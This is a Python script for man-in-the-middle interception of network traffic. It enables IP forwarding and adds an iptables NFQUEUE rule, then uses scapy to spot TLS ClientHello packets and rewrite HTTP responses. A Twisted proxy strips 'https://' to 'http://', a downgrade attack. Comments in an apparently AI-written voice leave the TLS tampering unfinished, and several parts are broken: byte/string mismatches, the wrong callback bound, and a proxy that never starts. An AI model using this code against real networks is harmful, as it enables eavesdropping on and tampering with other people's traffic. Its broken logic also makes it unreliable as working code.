from scapy.all import *
from OpenSSL import SSL
import os
from netfilterqueue import NetfilterQueue
import re
from twisted.web import http


# Dictionary to keep track of TCP connections and SSL contexts
tcp_connections = {}
ssl_contexts = {}

def is_tls_client_hello(packet):
    # The first byte of the TLS record should be 0x16 (Handshake)
    if packet[Raw].load[0] != '\x16':
        return False

    # The next two bytes are the TLS version (should be 0x0301, 0x0302, 0x0303 for TLS 1.0, 1.1, 1.2)
    if packet[Raw].load[1:3] not in ['\x03\x01', '\x03\x02', '\x03\x03']:
        return False

    # The next byte (the 6th byte of the record) should be 0x01 (ClientHello)
    if packet[Raw].load[5] != '\x01':
        return False

    return True

# Your existing ProxyRequestHandler class
class ProxyRequestHandler(http.Request):
    def process(self):
        self.content.seek(0, 0)
        headers = self.getAllHeaders().copy()
        requestContent = self.content.read()
        headers['Content-Length'] = len(requestContent)

        # Modify the request content here
        requestContent = re.sub('https://', 'http://', requestContent)

        self.setResponseCode(200, 'OK')
        self.responseHeaders = headers
        self.write(requestContent)
        self.finish()

class Proxy(http.HTTPChannel):
    requestFactory = ProxyRequestHandler

class ProxyFactory(http.HTTPFactory):
    protocol = Proxy

def start_proxy():
    from twisted.internet import reactor
    factory = ProxyFactory()
    reactor.listenTCP(10000, factory)
    reactor.run()

# The intercept_packet function
def process_packet(packet):
    # Check if packet is a ClientHello message
    if is_tls_client_hello(packet):
        print("[+] TLS ClientHello detected...")
        # Here you would implement the logic to modify the ClientHello message
        # and send it to the server. This is a complex task that requires a
        # deep understanding of the TLS protocol and is beyond the scope of this
        # assistant.

# modified to call intercept_packet
def intercept_packet(packet):
    print("[+] Packet intercepted: ")

    print("--------------------------------------------------")
    # Convert packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    #print(scapy_packet.show())
    
    # Check if packet is a HTTP request
    if scapy_packet.haslayer(TCP):
        if scapy_packet[TCP].dport == 80:
            print("[+] HTTP Request...")
            if scapy_packet.haslayer(Raw):
                load = scapy_packet[Raw].load.decode()
                scapy_packet[Raw].load = load.encode()
                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum
                packet.set_payload(bytes(scapy_packet))
        elif scapy_packet[TCP].dport == 443:
            print("[+] HTTPS Request...")
            if scapy_packet.haslayer(Raw):
                if is_tls_client_hello(scapy_packet):
                    print("[+] TLS ClientHello detected...")
                    # Here you would implement the logic to modify the ClientHello message
                    # and send it to the server. This is a complex task that requires a
                    # deep understanding of the TLS protocol and is beyond the scope of this
                    # assistant.

    # Check if the packet is a response
    if scapy_packet[TCP].sport == 80 and scapy_packet.haslayer(Raw):
        print("[+] HTTP Response...")
        load = scapy_packet[Raw].load.decode()

        # Modify the response as necessary
        load = re.sub('<html><body><h1>It works!</h1></body></html>', \
                        '<html><body><h1>Now you are seeing a modified packet</h1></body></html>', load)
            
        scapy_packet[Raw].load = load.encode()
        del scapy_packet[IP].len
        del scapy_packet[IP].chksum
        del scapy_packet[TCP].chksum
        packet.set_payload(bytes(scapy_packet))

    # Accept packet
    packet.accept()

    
def start():
    # Enable IP forwarding
    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")

    # Set up iptables rule
    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")

    # Set up packet queue
    queue = NetfilterQueue()
    queue.bind(0, process_packet)

    try:
        print("[+] Starting packet interception...")
        queue.run()
    except KeyboardInterrupt:
        print("\n[-] Stopping packet interception...")
        queue.unbind()

    # Start the proxy
    start_proxy()


if __name__ == "__main__":
    start()

'''
Clone the repository:
git clone https://github.com/tintinweb/scapy-ssl_tls.git
cd scapy-ssl_tls
python setup.py install



'''